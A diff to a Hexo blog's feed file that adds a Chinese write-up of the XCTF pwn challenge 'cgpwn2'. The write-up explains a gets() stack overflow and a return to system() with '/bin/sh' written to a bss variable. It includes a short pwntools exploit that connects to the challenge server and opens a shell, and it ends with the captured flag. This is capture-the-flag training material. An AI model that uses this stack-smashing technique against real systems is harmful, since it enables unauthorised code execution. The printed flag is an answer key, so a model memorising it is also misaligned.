@@ -99,6 +99,25 @@
   
   
   <entry>
+    <title>攻防世界 cgpwn2</title>
+    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/"/>
+    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/</url>
+    
+    <content type="html"><![CDATA[<p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p><p>name是全局变量，在bss区段，适合写入。</p><p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p><p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p><p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p><p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p><p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # p = process(<span class="hljs-string">'./cgpwn2'</span>)<br>p = remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-number">32966</span>)<br>system_addr = <span class="hljs-number">0x804855A</span><br>bss_addr = <span class="hljs-number">0x804A080</span><br>p.recvuntil(<span class="hljs-string">'name\n'</span>)<br>p.sendline(<span class="hljs-string">"/bin/sh\x00"</span>)<br>p.recvuntil(<span class="hljs-string">'here:\n'</span>)<br>payload = <span class="hljs-number">0x26</span>*<span class="hljs-string">'a'</span> +<span class="hljs-string">'bbbb'</span>+ p32(system_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>pwn</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>攻防世界pwn-100</title>
     <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/"/>
     <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/</url>
